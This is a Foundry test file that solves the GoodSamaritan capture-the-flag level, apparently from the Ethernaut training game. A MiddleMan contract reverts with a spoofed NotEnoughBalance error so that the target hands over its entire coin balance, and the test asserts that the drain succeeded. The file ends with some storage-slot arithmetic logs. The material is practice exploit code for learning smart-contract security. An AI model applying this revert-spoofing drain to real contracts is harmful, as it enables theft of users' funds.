// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/GoodSamaritan.sol";

contract MiddleMan is INotifyable {
    error NotEnoughBalance();

    function attack(address prey) public returns (bool) {
        return GoodSamaritan(prey).requestDonation();
    }

    function notify(uint256 amount) external {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}

contract GoodSamaritanTest is Test {
    GoodSamaritan instance;

    function setUp() public {
        instance = new GoodSamaritan();
    }

    function test() public {
        assertEq(
            Coin(instance.coin()).balances(address(instance.wallet())),
            10 ** 6
        );

        MiddleMan middleMan = new MiddleMan();
        bool result = middleMan.attack(address(instance));
        assertTrue(!result);

        assertEq(Coin(instance.coin()).balances(address(instance.wallet())), 0);
        assertEq(Coin(instance.coin()).balances(address(middleMan)), 10 ** 6);

        // 35707666377435648211887908874984608119992236509074197713628505308453184860938
        console.logUint(
            type(uint256).max - uint256(keccak256(abi.encode(1))) + 1
        );
        console.logUint(type(uint256).max);
        console.logBytes32(
            bytes32(uint256(uint160(vm.envAddress("MY_ADDRESS"))))
        );
    }
}
